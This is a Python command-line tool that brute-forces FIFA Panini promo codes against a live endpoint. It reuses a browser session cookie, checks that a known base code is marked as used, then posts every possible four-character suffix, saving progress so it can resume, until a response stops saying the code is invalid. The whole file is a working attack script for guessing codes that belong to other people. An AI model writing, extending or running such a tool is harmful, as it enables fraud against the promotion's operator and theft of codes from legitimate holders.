import json
import time
from pathlib import Path

import classyclick
import click
from tqdm import tqdm

from ..cli import CLI
from .try_code import (
    CODE_ALREADY_USED_MARKER,
    DEFAULT_ENDPOINT,
    DEFAULT_REQUEST_DELAY,
    DEFAULT_STATE_FILE,
    INVALID_CODE_MARKER,
    SUFFIX_ALPHABET,
    TOTAL_SUFFIXES,
    CodeMethodsMixin,
)


class BfCode(CodeMethodsMixin, CLI.Command):
    """Brute-force FIFA Panini promo codes by iterating the final block."""

    code_base: str = classyclick.Option(
        help='Promo code base in XXXX-XXXX-XXXX format; the final block is iterated.',
    )
    cookie: str = classyclick.Option(
        '-c',
        '--cookie',
        help='Complete Cookie header value copied from the browser request.',
    )
    endpoint: str = classyclick.Option(
        default=DEFAULT_ENDPOINT,
        show_default=True,
        help='Endpoint URL to test against.',
    )
    state_file: Path = classyclick.Option(
        '-s',
        default=Path(DEFAULT_STATE_FILE),
        show_default=True,
        help='Path used to save resume state.',
    )
    dry_run: bool = classyclick.Option(default=False, help='Print the request that would be attempted.')
    request_timeout: float = classyclick.Option(
        '--timeout',
        default=30.0,
        show_default=True,
        help='HTTP request timeout in seconds.',
    )
    request_delay: float = classyclick.Option(
        '--request-delay',
        default=DEFAULT_REQUEST_DELAY,
        show_default=True,
        help='Delay between requests in seconds.',
    )

    def __call__(self):
        self.validate_settings()

        if self.dry_run:
            code = self.next_code()
            tqdm.write(f'DRY RUN POST {self.endpoint} code={code}')
            return

        self.check_code_base()
        start = self.start_suffix()
        with tqdm(total=TOTAL_SUFFIXES, initial=start, unit='code') as progress:
            for code in self.iter_codes(start):
                progress.set_description(f'Testing {code}')
                self.save_state(code, self.suffix_from_code(code))
                response = self.send_code(code)

                if INVALID_CODE_MARKER not in response.text:
                    tqdm.write(f'Stopping at {code}: response did not contain {INVALID_CODE_MARKER}')
                    self.print_response(response)
                    return

                self.save_state(code, self.suffix_from_code(code) + 1)
                progress.update()
                if self.request_delay:
                    time.sleep(self.request_delay)

        raise click.ClickException(f'All {TOTAL_SUFFIXES} suffixes were tried without a non-invalid response.')

    def validate_settings(self):
        missing = [name for name in ('code_base', 'cookie') if not getattr(self, name)]
        if missing:
            raise click.ClickException(
                f'Missing required setting(s): {", ".join(missing)}. '
                f'Pass them as options or save them in the config file.'
            )
        self.validate_code(self.code_base, '--code-base')
        if self.request_delay < 0:
            raise click.ClickException('--request-delay must be greater than or equal to 0.')

    def check_code_base(self):
        response = self.send_code(self.code_base)
        if CODE_ALREADY_USED_MARKER not in response.text:
            print(response.text)
            raise click.ClickException(
                f'Code base check failed for {self.code_base}: expected response to contain {CODE_ALREADY_USED_MARKER}.'
            )

    def iter_codes(self, start=None):
        if start is None:
            start = self.start_suffix()
        for suffix in range(start, TOTAL_SUFFIXES):
            yield self.format_code(suffix)

    def next_code(self):
        start = self.start_suffix()
        if start >= TOTAL_SUFFIXES:
            raise click.ClickException(f'All {TOTAL_SUFFIXES} suffixes have already been tried for this code base.')

        return self.format_code(start)

    def start_suffix(self):
        state = self.load_state()
        if state is None:
            return 0

        if state.get('code_base') != self.code_base:
            return 0

        next_suffix = int(state.get('next_suffix', 0))
        return min(next_suffix, TOTAL_SUFFIXES)

    def load_state(self):
        state_file = self.state_path
        if not state_file.exists():
            return None

        try:
            with state_file.open() as state:
                return json.load(state)
        except (OSError, json.JSONDecodeError) as error:
            raise click.ClickException(f'Could not read state file {state_file}: {error}') from error

    def save_state(self, code, next_suffix):
        state = {
            'code_base': self.code_base,
            'current_code': code,
            'next_suffix': next_suffix,
        }
        state_file = self.state_path
        try:
            state_file.parent.mkdir(parents=True, exist_ok=True)
            with state_file.open('w') as file:
                json.dump(state, file, indent=2)
                file.write('\n')
        except OSError as error:
            raise click.ClickException(f'Could not write state file {state_file}: {error}') from error

    def suffix_from_code(self, code):
        suffix = 0
        for character in code[-4:]:
            suffix = suffix * len(SUFFIX_ALPHABET) + SUFFIX_ALPHABET.index(character)
        return suffix

    def format_code(self, suffix):
        characters = []
        for _ in range(4):
            suffix, index = divmod(suffix, len(SUFFIX_ALPHABET))
            characters.append(SUFFIX_ALPHABET[index])
        return f'{self.code_base[:-4]}{"".join(reversed(characters))}'
